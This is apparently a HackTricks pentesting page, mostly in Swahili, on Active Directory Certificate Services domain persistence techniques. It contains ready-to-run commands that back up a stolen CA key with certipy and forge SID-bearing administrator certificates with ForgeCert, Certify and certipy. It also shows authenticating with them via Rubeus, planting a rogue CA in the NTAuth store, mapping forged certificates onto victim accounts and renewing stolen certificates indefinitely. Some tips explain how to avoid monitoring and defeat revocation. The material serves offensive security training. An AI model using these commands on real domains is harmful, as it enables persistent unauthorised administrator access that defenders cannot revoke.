# AD CS Uendelevu wa Domain

{{#include ../../../banners/hacktricks-training.md}}

**Hii ni muhtasari wa mbinu za uendelevu wa domain zilizoshirikiwa katika [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Angalia kwa maelezo zaidi.

## Kuforgia Certificates kwa Kutumia Vyeti vya CA Vilivoriwa (Golden Certificate) - DPERSIST1

Unawezaje kubaini kwamba cheti ni cheti cha CA?

Inaweza kubainika kwamba cheti ni cheti cha CA ikiwa masharti kadhaa yamekutana:

- Cheti kimehifadhiwa kwenye server ya CA, na ufunguo wake wa kibinafsi ulilindwa na DPAPI ya mashine, au na vifaa kama TPM/HSM ikiwa mfumo wa uendeshaji unaiunga mkono.
- Mashamba ya Issuer na Subject ya cheti yanalingana na jina maalum la CA.
- Kiongezi kinachoitwa "CA Version" kipo pekee kwenye vyeti vya CA.
- Cheti hakina mashamba ya Extended Key Usage (EKU).

Ili kutoa ufunguo wa kibinafsi wa cheti hiki, zana `certsrv.msc` kwenye server ya CA ndiyo njia inayotumika kupitia GUI iliyojengwa. Hata hivyo, cheti hiki hakutofautiani na vyengine vilivyohifadhiwa ndani ya mfumo; hivyo, mbinu kama [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zinaweza kutumika kwa uchimbaji.

Cheti na ufunguo wa kibinafsi pia yanaweza kupatikana kwa kutumia Certipy na amri ifuatayo:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Baada ya kupata cheti cha CA na ufunguo wake wa kibinafsi katika muundo wa `.pfx`, zana kama [ForgeCert](https://github.com/GhostPack/ForgeCert) zinaweza kutumika kutengeneza vyeti halali:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Mtumiaji anayelengwa kwa certificate forgery lazima awe aliye hai na awe na uwezo wa kujithibitisha katika Active Directory ili mchakato ufanikiwe. Forging a certificate kwa akaunti maalum kama krbtgt haifai.

This forged certificate will be **valid** until the end date specified and as **long as the root CA certificate is valid** (usually from 5 to **10+ years**). It's also valid for **machines**, so combined with **S4U2Self**, an attacker can **maintain persistence on any domain machine** for as long as the CA certificate is valid.\ Moreover, the **certificates generated** with this method **cannot be revoked** as CA is not aware of them.

### Kuendeshwa chini ya Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- Contain a strong binding to the target account (for example, the SID security extension), or
- Be paired with a strong, explicit mapping on the target object’s `altSecurityIdentities` attribute.

A reliable approach for persistence is to mint a forged certificate chained to the stolen Enterprise CA and then add a strong explicit mapping to the victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Vidokezo
- Ikiwa unaweza kutengeneza forged certificates zinazojumuisha SID security extension, zitatafsiriwa kwa njia isiyo dhahiri hata chini ya Full Enforcement. Vinginevyo, pendelea explicit strong mappings. Angalia [account-persistence](account-persistence.md) kwa maelezo zaidi kuhusu explicit mappings.
- Revocation haimsaidii watetezi hapa: forged certificates hazijulikani kwa CA database na kwa hivyo haviwezi kufutwa.

#### Full-Enforcement compatible forging (SID-aware)

Updated tooling inakuwezesha ku-embed SID moja kwa moja, zikifanya golden certificates zitumike hata wakati DCs zinakataa weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Kwa kuingiza SID unaepuka kuhitaji kugusa `altSecurityIdentities`, ambayo inaweza kufuatiliwa, huku bado ukitimiza ukaguzi thabiti wa upatanisho.

## Kuamini Cheti za CA zisizo halali - DPERSIST2

Kitu `NTAuthCertificates` kimefafanuliwa kuwa kinaweza kuwa na cheti kimoja au zaidi za **CA certificates** katika sifa yake ya `cacertificate`, ambazo Active Directory (AD) hutumia. 

Mchakato wa uhakiki unaofanywa na **domain controller** unahusisha kukagua kitu `NTAuthCertificates` kwa ajili ya kipengee kinacholingana na **CA specified** katika uwanja wa Issuer wa inayoikagua **certificate**. Uthibitishaji unaendelea ikiwa mechi inapatikana.

Cheti cha CA chenye kusainiwa mwenyewe kinaweza kuongezwa kwenye kitu `NTAuthCertificates` na mdukuzi, mradi wao wanadhibiti kitu hiki cha AD. Kawaida, ni wanachama wa kikundi cha **Enterprise Admin**, pamoja na **Domain Admins** au **Administrators** katika **forest root’s domain**, ndio wanaoruhusiwa kubadilisha kitu hiki. Wanaweza kuhariri kitu `NTAuthCertificates` kwa kutumia `certutil.exe` na amri `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, au kwa kutumia [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Amri za ziada za kusaidia kwa mbinu hii:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Uwezo huu ni muhimu hasa linapotumika pamoja na mbinu iliyotajwa hapo awali inayohusisha ForgeCert kuunda vyeti kwa wakati wa utekelezaji.

> Mambo ya kuzingatia baada ya 2025 kwa mapping: placing a rogue CA in NTAuth only establishes trust in the issuing CA. Ili kutumia leaf certificates kwa logon wakati DCs ziko katika **Full Enforcement**, leaf lazima iwe na ugani wa usalama wa SID au kuwepo kwa ramani thabiti wazi kwenye object lengwa (kwa mfano, Issuer+Serial katika `altSecurityIdentities`). Angalia {{#ref}}account-persistence.md{{#endref}}.

## Usanidi mbaya wa kisaliti - DPERSIST3

Fursa za **persistence** kupitia **security descriptor modifications of AD CS** components ni nyingi. Modifications described in the "[Domain Escalation](domain-escalation.md)" section can be maliciously implemented by an attacker with elevated access. Hii inajumuisha kuongeza "control rights" (mfano, WriteOwner/WriteDACL/etc.) kwa vipengele nyeti kama:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

Mfano wa utekelezaji wa kisaliti utahusisha mshambuliaji, ambaye ana **elevated permissions** katika domain, kuongeza ruhusa ya **`WriteOwner`** kwenye template ya cheti ya default ya **`User`**, na mshambuliaji kuwa mhusika wa haki hiyo. Ili kufaida hili, mshambuliaji atabadilisha kwanza umiliki wa template ya **`User`** kuwa yeye mwenyewe. Baadaye, **`mspki-certificate-name-flag`** itawekwa kwa **1** kwenye template ili kuwezesha **`ENROLLEE_SUPPLIES_SUBJECT`**, ikimruhusu mtumiaji kutoa Subject Alternative Name katika ombi. Baadaye, mshambuliaji anaweza **enroll** akitumia **template**, akisogeza jina la **domain administrator** kama jina mbadala, na kutumia cheti alichopata kwa ajili ya authentication kama DA.

Vigezo vitakavyowekwa na mashambulizi kwa persistence ya muda mrefu ya domain (see {{#ref}}domain-escalation.md{{#endref}} for full details and detection):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> Katika mazingira yaliyoimarishwa baada ya KB5014754, kuoanisha misconfigurations hizi na ramani thabiti wazi (`altSecurityIdentities`) kunahakikisha vyeti ulivyotoa au kuunda kwa forgeries vinabaki vinavyoweza kutumika hata wakati DCs zinatekeleza strong mapping.

### Certificate renewal abuse (ESC14) for persistence

Ikiwa utaingilia cheti chenye uwezo wa authentication (au cha Enrollment Agent), unaweza **renew it indefinitely** mradi template inayotoa bado imechapishwa na CA yako bado inaamini issuer chain. Upya unahifadhi vifungo vya utambulisho vya asili lakini unaongeza uhalali, na kufanya kuondolewa kuwa ngumu isipokuwa template itarekebishwa au CA itatangazwa tena.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Iwapo domain controllers ziko katika **Full Enforcement**, ongeza `-sid <victim SID>` (au tumia template ambayo bado inajumuisha SID security extension) ili cheti la leaf lililofanyiwa upya liendelee kuambatana kwa nguvu bila kugusa `altSecurityIdentities`. Wadukuzi wenye haki za CA admin pia wanaweza kurekebisha `policy\RenewalValidityPeriodUnits` ili kuongezea muda wa uhai wa vyeti vilivyofanywa upya kabla ya kujitoa cheti kwao wenyewe.

## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
